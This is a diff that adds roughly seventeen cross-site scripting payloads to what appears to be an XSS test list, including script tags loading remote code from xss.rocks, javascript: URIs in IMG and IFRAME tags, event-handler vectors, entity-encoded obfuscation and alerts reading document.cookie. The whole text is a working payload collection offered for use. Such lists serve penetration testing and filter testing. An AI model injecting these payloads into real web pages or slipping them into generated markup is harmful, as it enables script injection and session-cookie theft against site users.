@@ -31,3 +31,20 @@
 https://brutelogic.com.br/poc.svg
 http://xss.rocks/scriptlet.html
 poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG """><SCRIPT>alert(document.cookie)</SCRIPT>"\>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<<SCRIPT>alert(document.cookie);//\<</SCRIPT>>
+<iframe src=http://xss.rocks/scriptlet.html <
+</script><script>alert(document.cookie);</script>
+</TITLE><SCRIPT>alert(document.cookie);</SCRIPT>
+<BODY ONLOAD=alert(document.cookie)>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
